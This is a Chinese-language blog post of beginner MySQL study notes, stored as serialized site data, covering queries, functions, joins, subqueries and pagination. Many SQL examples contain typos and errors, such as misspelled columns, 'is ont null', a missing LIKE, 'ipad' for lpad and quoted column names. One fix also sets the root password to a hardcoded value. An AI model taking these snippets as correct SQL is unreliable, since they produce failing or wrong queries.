​\t\t注意：<>为不等于的意思\n\n2. 按逻辑表达式筛选：\n\n   ​\t\t&&， ||， ！\n\n   ​\t\tand，or，not   // SQL推荐使用\n\n3. 模糊查询\n\n   ​\t\tlike, between and, in, is null\n\n   - between and 等价与  >=  and <=\n\n   模糊查询通常与通配符一起使用  (in 不支持)\n\n   - 常见通配符：% 匹配任意一个或零个\n\n     ​\t\t\t\t\t _  (下划线) 匹配任意一个\n\n     - 支持对通配符进行转义\n\n```\nselect 字段 from 表名 where like '_$_' escape '$'; //使用$符号对下划线进行转义\n```\n\n```\nselect × from 表名 where like %a%;\n```\n\n4. 安全等于  <=> : 可以判断显示NULL\n\n\n\n#### 3、排序查询\n\n- 语法：\n\n```\nselect 字段\nfrom 表\nwhere 筛选条件\norder by 排序列表 asc|desc   //不写关键字，默认是asc\n# asc 从低到高 （升序）\n# desc 从高到底 （降序）\n```\n\n- 支持别名排序， 运算表达式排序\n- 支持对多个列表进行先后排序查询，列表间用逗号隔开\n- 排序语句一般是放在查询语句的最后面\n\n\n\n#### 常见函数\n\n- 类似python中的方法\n- 函数可以嵌套使用\n- 分类：\n\n1. 单行函数：concat, length, ifnull等\n2. 分组函数：\n   + 功能：做统计使用，又称为统计函数，聚合函数，组函数\n\n##### 单行函数\n\n###### 一、字符函数\n\n1. length \n\n```\nselect length('str');\n```\n\n2. concat ( ) 拼接函数\n\n```\nconcat(str1, str2 ,..., str n); //拼接字符串字段进行查询，字段之间用逗号隔开\n# 若str中有值为NULL，则查询的所有值为NULL\n```\n\n3. upper( ), lower( ) :改变大小写\n\n4. substr( ) ：截取字符函数\n\n```\nselect substr('今天买了个大白菜'， 6);\n结果: 大白菜\nselect substr('今天买了个大白菜'， 3, 4);\n结果: 买了\n```\n\n5. instr( ) :返回字串第一个字符的索引，没有则返回0\n\n```\nselect instr('今天买了个大白菜'， '大白菜');\n结果：6\n```\n\n6. trim( ) :去掉字段中的空格或指定字符\n\n```\nselect trim('烂的' from '今天买了个烂的大白菜');\n结果：今天买了个大白菜\n```\n\n7. lpad( ): 左填充指定长度的字符，\n\n   rpad( ): 右填充指定长度的字符\n\n```\nselect ipad('大白菜', 6, '*');\n结果：×××大白菜\nselect rpad('大白菜', 6, '*');\n结果：大白菜×××\n```\n\n8. replace 替换\n\n```\nselect replace('今天买了个大白菜', '大白菜', '胡萝卜');\n结果：今天买了个胡萝卜\n```\n\n###### 二、数学函数\n\n1. round( ) : 四舍五入函数\n\n```\nselect round(1.1236);  //默认保留整数部分\n结果：1\nselect round(1.1236, 3);  //可指定保留小数部分\n结果：1.124\n```\n\n2. ceil( ): 向上取整，返回 >= 该函数的最小整数\n3. floor( ): 向下取整，返回  <= 该函数的最大整数\n\n```\nselect floor(-9.99);\n结果：-10\n```\n\n4. truncate 截断函数，截断小数点后指定的位数\n\n```\nselect truncate(1.123, 2);\n结果：1.12\n```\n\n5. mod( ): 取模（取余）函数\n\n```\nselect mod(10,3);\n结果：1\n```\n\n###### 三、日期函数\n\n1. now( ) 返回当前系统日期+时间\n2. curdate( ) 返回当前系统日期，不返回时间\n3. curtime( ) 返回当前时间，不返回日期\n4. str_to_date( ) 将日期格式的字符转换成指定格式的日期\n5. date_format( ) 将日期转换成字符\n\n- 更多日期函数请上网搜索\n\n###### 四、流程控制函数\n\n1. if( ) :该函数起到的作用类似与python或C语言中的else if( )函数\n2. case( )： \n\n```\ncase 要判断的字段或表达式    // 选择函数——判断并选择显示一个\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend\n```\n\n```\ncase\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend\n```\n\n###### 五、其它函数\n\n- 其他函数太多，用时上网搜\n\n##### 分组函数\n\n- 功能：用作统计使用，又称为聚合函数或统计函数或组函数\n- 分类：sum 求和， avg 平均值， max， min， count 计算个数\n- 忽略 NULL值\n- 可以与distinct( )去重函数或其它函数搭配使用\n- count( )详细介绍\n\n```\nselect count(*) from 表单;  //统计总行数\n```\n\n- 和分组函数一同查询的字段要求是group by后的字段\n\n#### 4、分组查询\n\n1. 语法：\n\n```\nselect 分组函数，列（要求出现在group by的后面）\nfrom 表\n[where 筛选条件]\ngroup by 分组的列表;\n[order by 子句]\n\n// 查询列表必须特殊，要求是分组函数和group by 后出现的字段\n```\n\n- 简单的分组查询\n\n1. 实例一：查询每个工种的最高工资\n\n```\nselect max(salary), job_id\nfrom employees\ngroup by job_id;\n```\n\n3. 实例二：查询每个位置上的部门个数\n\n```\nselect count(*), location_id\nfrom departments\ngroup by lacation_id;\n```\n\n- 添加筛选条件的分组查询\n\n4. 实例三：查询邮箱中包含a字符的，每个部门的平均工资\n\n```\nselect avg(salsry), department_id\nfrom employees\nwhere email '%a%'\ngroup by department_id;\n```\n\n5. 实例四：查询有奖金的每个领导手下员工的最高工资\n\n```\nselect max(salary), manager_id\nfrom employees\nwhere commission_pct is ont null\ngroup by manager_id;\n```\n\n- 添加复杂筛选条件的分组查询\n- 分组后进行条件筛选的查询\n\n6. 实例五：查询哪个部门的员工个数>2\n\n```\nselect count(*), depatment_id\nfrom employees\ngroup by department_id\nhaving count(*)>2;   //用查询的结果再进行筛选时用having\n```\n\n#### 5、连接查询【 优先学习99语法 】\n\n1. 含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询\n\n2. 笛卡尔乘积现象：表1有m行，表2有n行，结果有m×n行\n\n   1. 发生原因：没有有效的链接条件\n   2. 如何避免：添加有效的连接条件\n\n3. 按功能分类：\n\n   - 内连接：等值连接\n\n     ​\t\t\t   非等值连接\n\n     ​\t\t\t   自连接\n\n   - 外连接：左外连接\n\n     ​\t\t\t   右外连接\n\n     ​\t\t\t   全外连接\n\n   - 交叉连接\n\n##### SQL92语法\n\n(1) 等值查询\n\n- 查询员工名和对应的部门名\n\n```\nselect last_name, department_name\nfrom employees, departments\nwhere employees.'department_id=departments.'department_id';\n```\n\n- 多条件筛选连接查询\n  - 查询有奖金的员工名，部门名\n\n```\nselect last_name, department_name, commission_pct\nfrom emplloees e, departments d\nwhere e.'department_id'=d.'department_id'\nand e.'commission_pct' is not null;\n```\n\n(2) 非等值链接\n\n- 在等值链接的基础上将条件改为非等值就行\n\n(3) 自链接\n\n- 自己链接自己\n\n- 实例:查询查询一张表中员工名和上级的名称\n\n```\nselect e.employee_id, e.last_name, m.employee_id, m.last_name\nfrom employees e, employees m\nwhere e.'manager_id'=m.'employee_id';\n```\n\n\n\n##### SQL99语法\n\n- 语法： select 查询列表\n\n  ​\t\t\tfrom 表1 别名\n\n   \t\t   [连接类型]  join 表2 别名\n\n  ​\t\t\ton 连接条件\n\n  ​\t\t\twhere 筛选条件\n\n  ​\t\t\tgroup by 分组\n\n  ​\t\t\thaving 筛选条件\n\n  ​\t\t\torder by 排序条件\n\n###### 内链接\n\n- 语法：\n\n```\nselect 查询列表\nfrom 表1 别名\ninner join 表2 别名\non 连接条件；\n```\n\n- 分类：\n\n```\n内链接：inner\n外链接\n\t左外：left【outer】  //括号中outer可以省去\n\t右外：right 【outer】\n\t全外：full 【outer\n交叉连接：cross\n```\n\n\n\n1. 等值查询（内连接）\n\n```\n案例1 查询员工名、部门名\nselect last_name, department_name\nfrom employees e\ninner join departments d\non e.'department_id' = d.'department_id';\n```\n\n\n\n2. 非等值连接(内链接)\n\n```\n案例1：查询员工的工资级别\nselect salary, grdae_level\nfrom employees e\njoin job_grades g\non e.'salary' between g.'lowest_sal' and 'highest_sal';\n```\n\n\n\n3. 自连接（内连接）\n\n```\n查询员工的名字，上级的名字,包含字符k的\nselect e.last_name, m.last_name\njoin employees m\non e.'manager_id' = m.'employee_id'\nwhere e.'last_name' like '%k%';\n```\n\n\n\n###### 外连接\n\n- 应用场景，一个表格有，一个表格没有\n- 特点：\n\n1. 外连接的查询结果为主表中的所有记录\n\n   如果从表中有和他匹配的，则显示匹配值\n\n   如果从表中没有和它匹配的值，则显示null\n\n   外连接查询结果=内链接结果+主表中有而从表中没有的记录\n\n2. 左外连接，left join左边的是主表\n\n   右外连接，right join右边的是主表\n\n   左外右外和俩个表都换一下顺序，可以实现同样的效果\n\n- 主表：查询内容较多的表格\n\n- 全外连接：全外连接=内连接的结果+表1中有但表2中没有的+表2中有但表1中没有的\n\n\n\n###### 交叉连接\n\n- 相当于用99语法实现的笛卡尔乘积\n\n图示：\n\n![NBjOQf.png](https://s1.ax1x.com/2020/06/25/NBjOQf.png)\n\n![NBjXy8.png](https://s1.ax1x.com/2020/06/25/NBjXy8.png)\n\n\n\n#### 6、子查询\n\n1. 含义：出现在其他语句中的select语句，称为子查询或内查询\n2. 分类：\n\n```\n按子查询出现的位置：\n\t\tselect后面：\n\t\t\t仅仅支持标量子查询\n\t\tfrom后面：\n\t\t\t支持表子查询\n\t\twhere或having后面： // 重点\n\t\t\t标量子查询\t   //  重点\n\t\t\t列子查询\t\t// 重点\n\t\t\t行子查询\t\t// 重点\n\t\texists后面（相关子查询）\n\t\t\t表子查询\n按结果集的行列数不同：\n\t\t标量子查询：结果集只有一行一列\n\t\t列子查询：结果集有一列多行\n\t\t行子查询：结果集有一行多列\n\t\t表子查询：结果集有多行多列\n```\n\n\n\n- （一）where或having后面\n\n1. 标量子查询（单行子查询）\n\n2. 列子查询（多行子查询）\n\n3. 行子查询（多行多列）\n\n4. 特点：（1）子查询放在小括号内\n\n   ​\t\t   （2）子查询一般放在条件的右侧\n\n   ​\t\t\t（3）标量子查询，一般搭配着单行操作符使用<  > =   >=  <=等\n\n   ​\t\t\t \t\t列子查询，一般搭配多行操作符使用 in, any,some, all\n\n   ​\t\t\t  (4)子查询的执行优先于主查询，因为主查询要用到子查询\n\n1. 标量子查询\n\n```\n案例：谁的工资比sam高？\n#查询sam的工资\nselect salary\nfrom employees\nwhere last_name = 'sam'；\n\n#查询员工的信息，满足salary > sam工资 的结果\nselect *\nfrom employees\nwhere salary >(\n    select salary\n    from employees      //为更清晰的表达，子查询最好进行缩进\n    where last_name = 'sam'  \n)；\n```\n\n```\n案例：返回公司工资最少的员工的last_name,job_id,salary\n#查询公司的最低工资\nselect min(salary)\nfrom empolyees;\n\n#查询last_name, job_id, salary, 要求salary= 公司的最低工资\nselect last_name, job_id, salary\nfrom employees\nwhere salary=(\n    select min(salary)\n    from empolyees\n);\n```\n\n\n\n2. 列子查询(多行子查询）\n\n```\n案例：返回location_id是1400或1700的部门中的所有员工姓名\n#查询location_id是1700或1400的部门编号\nselect department_id\nfrom departments\nwhere location_id in(1400, 1700);\n\n#查询员工姓名，要求部门号是上个查询结果中的某一个\nselect employees\nwhere department_id in(\n    select department_id\n    from departments\n    where location_id in(1400, 1700)\n);\n```\n\n\n\n3. 行子查询（多行多列）\n\n   略\n\n\n\n- （二）放在select后面的标量子查询\n\n```\n案例：查询每个部门的员工个数\nselect d.*, (\n\tselect count(*)\n\tfrom empolyees e\n\twhere e.department_id = d.'department_id'\n) 个数\nfrom departments d;\n```\n\n\n\n- （三）放在from后面\n  - 将子查询结果当成一张表，要求必须起别名\n\n```\n案例：查询每个部门的平均工资的平均等级\n#查询每个部门的平均工资\nselect avg(salary), department_id\nfrom employees\ngroup by department_id\n\n#连接上个查询结果集和job_grades表，筛选条件平均工资\nselect ag_dep.*, g.'grade_level'\nfrom(\n\tselect avg(salary), department_id\n\tfrom employees\n\tgroup by department_id\n) ag_dep\ninner join job_grades g\non ag_dep.ag between lowest_sal and highest_sal;\n```\n\n\n\n- （四）放在exists后面（相关子查询）\n  - 能用exists的都能用in代替\n\n```\n语法：\n\texists 完整的查询语句\n结果：0或1   //返回一个布尔值\n```\n\n```\n案例：查询员工的部门名\nselect department_name\nfrom departments d\nwhere exists(\n\tselect *\n\tfrom employees e\n\twhere d.'department_id'=e.'depaertment_id'\n);\n```\n\n\n\n#### 7、分页查询\n\n1. 应用场景：当要显示的数据，一页显示不全，需要枫叶提交sql请求\n2. 语法：\n\n```\nselect 查询列表\nfrom 表\n连接类型 join 表2\non 连接条件\nwhere 筛选条件\ngroup by 分组字段\nhaving 分组后的筛选\norder by 排序的字段\nlimit offset, size;\n\noffset要显示条目的起始索引（起始索引从0开始）\nsize 要显示的条目个数\n```\n\n3. 案例：查询前五条员工信息\n\n```\nselect * from employees limit 0, 5;\n```\n\n4. 案例2：查询11条—第25条\n\n```\nselect * from employees limit 10, 15;\n```\n\n5. 案例3：有奖金的员工信息，并且工资较高的前10名显示出来\n\n```\nselect *\nfrom employees\nwhere commission_pic is not null\norder by salsry desc\nlimit 10;\n```\n\n6. 特点：\n\n- limit语句放在查询语句德尔最后\n- 公式：要显示的页数page，每页的条目数size\n\n```\nselect 查询列表\nfrom 表\nlimit (page-1)*size, size;\n```\n\n\n\n#### 8、联合查询\n\n1. union联合 ：将多个查询语句的结果合并成一个结果\n2. 语法：\n\n```\n查询语句1\nunion\n查询语句2\nunion\n...\n```\n\n3. 案例：查询部门编号>90或邮箱包含a的员工信息\n\n```\nselect *\nfrom employees\nwhere email like '%a%' or deaprtment_id>90;\n\nselect *\nfrom employees\nwhere email like '%a%'\nunion\nselect *\nfrom employees\nwhere deparment_id>90;\n```\n\n4. 特点：\n\n- 要求多条查询语句的查询列数是一致的\n- 要求多条查询语句的查询的每一列的类型和顺序最好一致\n- union关键字默认去重，如果使用union all 可以包含重复选项\n\n\n\n\n\n\n\n","source":"_posts/数据库.md","raw":"---\ntitle: MYSQL学习（一）\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_13.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: 数据库\ntags: [数据库, mysql, sql]   # 可以是数组\ntop: false\n---\n\n# 数据库的学习（一）\n\n- [相关视频链接](https://www.bilibili.com/video/BV12b411K7Zu/?p=28)\n\n## 数据库及其概念\n\n- DB 数据库\n- DBMS 数据库管理系统，如Mysql， MongoDB 等，用来管理与操作DB\n- SQL  管理数据库的语言，几乎被所有的DBMS支持\n- DB是大宅子，DBMS是宅子管家，SQL是管家的指挥口令\n\n<!--more-->\n\n### 数据库管理的特点\n\n1. 先将数据放到 “一张表” 中， 在将表放到仓库中\n2. 一个数据库中存放多张表，每张表都有自己独特的名字，用来标识自己\n3. 数据库中的每张表都有自己的类别，有自己的门派，参照python的  “类”\n4. 表是由列组成，也称为字段，相当与python中的  “属性”\n5. 表是按行储存的，每一行相当与python中的  ”对象“\n\n- 端口号port 3306\n\n### Linux 系统 Mysql 相关事项\n\n- 检查电脑是否存在Mysql ：whereis mysql  或者输入  mysql --version\n\n- systemctl start mysql.service 启动  或者 service mysql start\n  systemctl stop mysql.service 停止  或者 service mysql stop \n  systemctl restart mysql.service 重启\n- 检查电脑是否启动或关闭数据库：ps aux | grep mysqld  或者  pidof mysqld\n [相关检查操作链接](https://blog.csdn.net/qq_31083947/article/details/90248565)\n\n### 数据库常用命令\n\n1. 进入管理系统时时查看有那些数据库\n\n```\nshow databases;\n```\n\n2. 进入库\n\n```\nuse 库的名称;\n```\n\n3. 查看库里有哪些表\n\n```\nshow tables;\n```\n\n4. 从现在所在的库中查看别的库中存有的表\n\n```\nshow tables from 库的名称;\n```\n\n5. 查看现在在哪个库\n\n```\nselect database();\n```\n\n6. 查看表的内容\n\n```\ndesc 表的名称;\n```\n\n7. 创建表\n\n```\ncreate table 表名（\n\t列名 列类型，\n\t列名 列类型，\n\t...\n)\n```\n\n\n\n### SQL语法规范\n\n1. 不区分大小写，但建议关键字大写，表名，列名小写\n2. 每行命令u最好用分号结尾\n3. 每行命令根据需要，可以进行缩进，或换行\n4. SQL语法中索引从1开始\n5. 注释 \n\n- 单行注释：#注释文字\n- 单行注释：-- 注释文字（注意横杠后面有空格）\n- 多行注释：/× 注释文字 ×/\n\n### 使用 DBMS 图形化界面以及命令行登录时出现错误解决\n\n- [原文链接](https://www.cnblogs.com/leolztang/p/5094930.html)\n\n```\n~$ mysql -u root -p\nEnter password: \nERROR 1698 (28000): Access denied for user 'root'@'localhost'\n```\n\n- 解决\n\n```\n# 强制登录\nsudo mysql\n\nselect user, plugin from mysql.user;\n\nupdate mysql.user set authentication_string=PASSWORD('hero1314'), plugin='mysql_native_password' where user='root';\n\nflush privileges;\n\nsudo service mysql restart\n```\n\n\n\n## 数据库语言的学习\n\n### DQL语言的学习\n\n#### 1、基础查询\n\n- 语法\n\n```\nselect 查询列表 from 表名;\n```\n\n- 特点：\n\n1. 查询列表可以是：表中的字段，常量值，表达式，函数\n2. 查询结果是一个虚拟的表格，只是将结果用表格呈现出来而已\n\n- 查询字段\n\n```\nselect 字段一，字段二 from 表格;    //字段之间用逗号隔开\nselect * from 表格;  // 查询所有字段\n```\n\n- 着重号 `  （1的旁边的那个），用来标识字段\n\n- 查询常量值：select ' 字符或字符串 ’ ;\n\n- 起别名\n\n  ​\t别名有空格时，应用空格将别名括起来\n  \n  ​\t注意：如果为表起了别名，则查询的字段就不能使用原来的表名去限定 \n\n```\nselect 字段值 as 别名;  // as可以省略\n```\n\n- 去重：在被查询的字段之前加上关键字 distinct\n- \\+ 号的作用\n\n```\nselect 100+90; // 俩个操作数都为数值型，则做加法运算\n# 结果：190\nselect '100'+90;  // 俩个数中若有一方为字符串，则将进行转换，若转换成功，则将继续做加法运算，若转换失败，则将字符型数值转换成再在进行加法运算\n# 结果：190\nselect null+10; //若有一个方为null，则结果肯定为null\n```\n\n\n\n- ifnull( ) 函数\n\n```\nselect IFNULL(字段，0) as 别名; //若该字段真未NULL，则输出0,否则则输出该字段的值\n```\n\n\n\n#### 2、条件查询\n\n- 语法：\n\n```\nselect 查询列表 from 表名 where 筛选条件;\n```\n\n- 分类：\n\n1. 按表达条件筛选：\n\n   ​\t\t逻辑运算符：> , <, =, <> , <=, >=\n\n   ​\t\t注意：<>为不等于的意思\n\n2. 按逻辑表达式筛选：\n\n   ​\t\t&&， ||， ！\n\n   ​\t\tand，or，not   // SQL推荐使用\n\n3. 模糊查询\n\n   ​\t\tlike, between and, in, is null\n\n   - between and 等价与  >=  and <=\n\n   模糊查询通常与通配符一起使用  (in 不支持)\n\n   - 常见通配符：% 匹配任意一个或零个\n\n     ​\t\t\t\t\t _  (下划线) 匹配任意一个\n\n     - 支持对通配符进行转义\n\n```\nselect 字段 from 表名 where like '_$_' escape '$'; //使用$符号对下划线进行转义\n```\n\n```\nselect × from 表名 where like %a%;\n```\n\n4. 安全等于  <=> : 可以判断显示NULL\n\n\n\n#### 3、排序查询\n\n- 语法：\n\n```\nselect 字段\nfrom 表\nwhere 筛选条件\norder by 排序列表 asc|desc   //不写关键字，默认是asc\n# asc 从低到高 （升序）\n# desc 从高到底 （降序）\n```\n\n- 支持别名排序， 运算表达式排序\n- 支持对多个列表进行先后排序查询，列表间用逗号隔开\n- 排序语句一般是放在查询语句的最后面\n\n\n\n#### 常见函数\n\n- 类似python中的方法\n- 函数可以嵌套使用\n- 分类：\n\n1. 单行函数：concat, length, ifnull等\n2. 分组函数：\n   + 功能：做统计使用，又称为统计函数，聚合函数，组函数\n\n##### 单行函数\n\n###### 一、字符函数\n\n1. length \n\n```\nselect length('str');\n```\n\n2. concat ( ) 拼接函数\n\n```\nconcat(str1, str2 ,..., str n); //拼接字符串字段进行查询，字段之间用逗号隔开\n# 若str中有值为NULL，则查询的所有值为NULL\n```\n\n3. upper( ), lower( ) :改变大小写\n\n4. substr( ) ：截取字符函数\n\n```\nselect substr('今天买了个大白菜'， 6);\n结果: 大白菜\nselect substr('今天买了个大白菜'， 3, 4);\n结果: 买了\n```\n\n5. instr( ) :返回字串第一个字符的索引，没有则返回0\n\n```\nselect instr('今天买了个大白菜'， '大白菜');\n结果：6\n```\n\n6. trim( ) :去掉字段中的空格或指定字符\n\n```\nselect trim('烂的' from '今天买了个烂的大白菜');\n结果：今天买了个大白菜\n```\n\n7. lpad( ): 左填充指定长度的字符，\n\n   rpad( ): 右填充指定长度的字符\n\n```\nselect ipad('大白菜', 6, '*');\n结果：×××大白菜\nselect rpad('大白菜', 6, '*');\n结果：大白菜×××\n```\n\n8. replace 替换\n\n```\nselect replace('今天买了个大白菜', '大白菜', '胡萝卜');\n结果：今天买了个胡萝卜\n```\n\n###### 二、数学函数\n\n1. round( ) : 四舍五入函数\n\n```\nselect round(1.1236);  //默认保留整数部分\n结果：1\nselect round(1.1236, 3);  //可指定保留小数部分\n结果：1.124\n```\n\n2. ceil( ): 向上取整，返回 >= 该函数的最小整数\n3. floor( ): 向下取整，返回  <= 该函数的最大整数\n\n```\nselect floor(-9.99);\n结果：-10\n```\n\n4. truncate 截断函数，截断小数点后指定的位数\n\n```\nselect truncate(1.123, 2);\n结果：1.12\n```\n\n5. mod( ): 取模（取余）函数\n\n```\nselect mod(10,3);\n结果：1\n```\n\n###### 三、日期函数\n\n1. now( ) 返回当前系统日期+时间\n2. curdate( ) 返回当前系统日期，不返回时间\n3. curtime( ) 返回当前时间，不返回日期\n4. str_to_date( ) 将日期格式的字符转换成指定格式的日期\n5. date_format( ) 将日期转换成字符\n\n- 更多日期函数请上网搜索\n\n###### 四、流程控制函数\n\n1. if( ) :该函数起到的作用类似与python或C语言中的else if( )函数\n2. case( )： \n\n```\ncase 要判断的字段或表达式    // 选择函数——判断并选择显示一个\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend\n```\n\n```\ncase\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend\n```\n\n###### 五、其它函数\n\n- 其他函数太多，用时上网搜\n\n##### 分组函数\n\n- 功能：用作统计使用，又称为聚合函数或统计函数或组函数\n- 分类：sum 求和， avg 平均值， max， min， count 计算个数\n- 忽略 NULL值\n- 可以与distinct( )去重函数或其它函数搭配使用\n- count( )详细介绍\n\n```\nselect count(*) from 表单;  //统计总行数\n```\n\n- 和分组函数一同查询的字段要求是group by后的字段\n\n#### 4、分组查询\n\n1. 语法：\n\n```\nselect 分组函数，列（要求出现在group by的后面）\nfrom 表\n[where 筛选条件]\ngroup by 分组的列表;\n[order by 子句]\n\n// 查询列表必须特殊，要求是分组函数和group by 后出现的字段\n```\n\n- 简单的分组查询\n\n1. 实例一：查询每个工种的最高工资\n\n```\nselect max(salary), job_id\nfrom employees\ngroup by job_id;\n```\n\n3. 实例二：查询每个位置上的部门个数\n\n```\nselect count(*), location_id\nfrom departments\ngroup by lacation_id;\n```\n\n- 添加筛选条件的分组查询\n\n4. 实例三：查询邮箱中包含a字符的，每个部门的平均工资\n\n```\nselect avg(salsry), department_id\nfrom employees\nwhere email '%a%'\ngroup by department_id;\n```\n\n5. 实例四：查询有奖金的每个领导手下员工的最高工资\n\n```\nselect max(salary), manager_id\nfrom employees\nwhere commission_pct is ont null\ngroup by manager_id;\n```\n\n- 添加复杂筛选条件的分组查询\n- 分组后进行条件筛选的查询\n\n6. 实例五：查询哪个部门的员工个数>2\n\n```\nselect count(*), depatment_id\nfrom employees\ngroup by department_id\nhaving count(*)>2;   //用查询的结果再进行筛选时用having\n```\n\n#### 5、连接查询【 优先学习99语法 】\n\n1. 含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询\n\n2. 笛卡尔乘积现象：表1有m行，表2有n行，结果有m×n行\n\n   1. 发生原因：没有有效的链接条件\n   2. 如何避免：添加有效的连接条件\n\n3. 按功能分类：\n\n   - 内连接：等值连接\n\n     ​\t\t\t   非等值连接\n\n     ​\t\t\t   自连接\n\n   - 外连接：左外连接\n\n     ​\t\t\t   右外连接\n\n     ​\t\t\t   全外连接\n\n   - 交叉连接\n\n##### SQL92语法\n\n(1) 等值查询\n\n- 查询员工名和对应的部门名\n\n```\nselect last_name, department_name\nfrom employees, departments\nwhere employees.'department_id=departments.'department_id';\n```\n\n- 多条件筛选连接查询\n  - 查询有奖金的员工名，部门名\n\n```\nselect last_name, department_name, commission_pct\nfrom emplloees e, departments d\nwhere e.'department_id'=d.'department_id'\nand e.'commission_pct' is not null;\n```\n\n(2) 非等值链接\n\n- 在等值链接的基础上将条件改为非等值就行\n\n(3) 自链接\n\n- 自己链接自己\n\n- 实例:查询查询一张表中员工名和上级的名称\n\n```\nselect e.employee_id, e.last_name, m.employee_id, m.last_name\nfrom employees e, employees m\nwhere e.'manager_id'=m.'employee_id';\n```\n\n\n\n##### SQL99语法\n\n- 语法： select 查询列表\n\n  ​\t\t\tfrom 表1 别名\n\n   \t\t   [连接类型]  join 表2 别名\n\n  ​\t\t\ton 连接条件\n\n  ​\t\t\twhere 筛选条件\n\n  ​\t\t\tgroup by 分组\n\n  ​\t\t\thaving 筛选条件\n\n  ​\t\t\torder by 排序条件\n\n###### 内链接\n\n- 语法：\n\n```\nselect 查询列表\nfrom 表1 别名\ninner join 表2 别名\non 连接条件；\n```\n\n- 分类：\n\n```\n内链接：inner\n外链接\n\t左外：left【outer】  //括号中outer可以省去\n\t右外：right 【outer】\n\t全外：full 【outer\n交叉连接：cross\n```\n\n\n\n1. 等值查询（内连接）\n\n```\n案例1 查询员工名、部门名\nselect last_name, department_name\nfrom employees e\ninner join departments d\non e.'department_id' = d.'department_id';\n```\n\n\n\n2. 非等值连接(内链接)\n\n```\n案例1：查询员工的工资级别\nselect salary, grdae_level\nfrom employees e\njoin job_grades g\non e.'salary' between g.'lowest_sal' and 'highest_sal';\n```\n\n\n\n3. 自连接（内连接）\n\n```\n查询员工的名字，上级的名字,包含字符k的\nselect e.last_name, m.last_name\njoin employees m\non e.'manager_id' = m.'employee_id'\nwhere e.'last_name' like '%k%';\n```\n\n\n\n###### 外连接\n\n- 应用场景，一个表格有，一个表格没有\n- 特点：\n\n1. 外连接的查询结果为主表中的所有记录\n\n   如果从表中有和他匹配的，则显示匹配值\n\n   如果从表中没有和它匹配的值，则显示null\n\n   外连接查询结果=内链接结果+主表中有而从表中没有的记录\n\n2. 左外连接，left join左边的是主表\n\n   右外连接，right join右边的是主表\n\n   左外右外和俩个表都换一下顺序，可以实现同样的效果\n\n- 主表：查询内容较多的表格\n\n- 全外连接：全外连接=内连接的结果+表1中有但表2中没有的+表2中有但表1中没有的\n\n\n\n###### 交叉连接\n\n- 相当于用99语法实现的笛卡尔乘积\n\n图示：\n\n![NBjOQf.png](https://s1.ax1x.com/2020/06/25/NBjOQf.png)\n\n![NBjXy8.png](https://s1.ax1x.com/2020/06/25/NBjXy8.png)\n\n\n\n#### 6、子查询\n\n1. 含义：出现在其他语句中的select语句，称为子查询或内查询\n2. 分类：\n\n```\n按子查询出现的位置：\n\t\tselect后面：\n\t\t\t仅仅支持标量子查询\n\t\tfrom后面：\n\t\t\t支持表子查询\n\t\twhere或having后面： // 重点\n\t\t\t标量子查询\t   //  重点\n\t\t\t列子查询\t\t// 重点\n\t\t\t行子查询\t\t// 重点\n\t\texists后面（相关子查询）\n\t\t\t表子查询\n按结果集的行列数不同：\n\t\t标量子查询：结果集只有一行一列\n\t\t列子查询：结果集有一列多行\n\t\t行子查询：结果集有一行多列\n\t\t表子查询：结果集有多行多列\n```\n\n\n\n- （一）where或having后面\n\n1. 标量子查询（单行子查询）\n\n2. 列子查询（多行子查询）\n\n3. 行子查询（多行多列）\n\n4. 特点：（1）子查询放在小括号内\n\n   ​\t\t   （2）子查询一般放在条件的右侧\n\n   ​\t\t\t（3）标量子查询，一般搭配着单行操作符使用<  > =   >=  <=等\n\n   ​\t\t\t \t\t列子查询，一般搭配多行操作符使用 in, any,some, all\n\n   ​\t\t\t  (4)子查询的执行优先于主查询，因为主查询要用到子查询\n\n1. 标量子查询\n\n```\n案例：谁的工资比sam高？\n#查询sam的工资\nselect salary\nfrom employees\nwhere last_name = 'sam'；\n\n#查询员工的信息，满足salary > sam工资 的结果\nselect *\nfrom employees\nwhere salary >(\n    select salary\n    from employees      //为更清晰的表达，子查询最好进行缩进\n    where last_name = 'sam'  \n)；\n```\n\n```\n案例：返回公司工资最少的员工的last_name,job_id,salary\n#查询公司的最低工资\nselect min(salary)\nfrom empolyees;\n\n#查询last_name, job_id, salary, 要求salary= 公司的最低工资\nselect last_name, job_id, salary\nfrom employees\nwhere salary=(\n    select min(salary)\n    from empolyees\n);\n```\n\n\n\n2. 列子查询(多行子查询）\n\n```\n案例：返回location_id是1400或1700的部门中的所有员工姓名\n#查询location_id是1700或1400的部门编号\nselect department_id\nfrom departments\nwhere location_id in(1400, 1700);\n\n#查询员工姓名，要求部门号是上个查询结果中的某一个\nselect employees\nwhere department_id in(\n    select department_id\n    from departments\n    where location_id in(1400, 1700)\n);\n```\n\n\n\n3. 行子查询（多行多列）\n\n   略\n\n\n\n- （二）放在select后面的标量子查询\n\n```\n案例：查询每个部门的员工个数\nselect d.*, (\n\tselect count(*)\n\tfrom empolyees e\n\twhere e.department_id = d.'department_id'\n) 个数\nfrom departments d;\n```\n\n\n\n- （三）放在from后面\n  - 将子查询结果当成一张表，要求必须起别名\n\n```\n案例：查询每个部门的平均工资的平均等级\n#查询每个部门的平均工资\nselect avg(salary), department_id\nfrom employees\ngroup by department_id\n\n#连接上个查询结果集和job_grades表，筛选条件平均工资\nselect ag_dep.*, g.'grade_level'\nfrom(\n\tselect avg(salary), department_id\n\tfrom employees\n\tgroup by department_id\n) ag_dep\ninner join job_grades g\non ag_dep.ag between lowest_sal and highest_sal;\n```\n\n\n\n- （四）放在exists后面（相关子查询）\n  - 能用exists的都能用in代替\n\n```\n语法：\n\texists 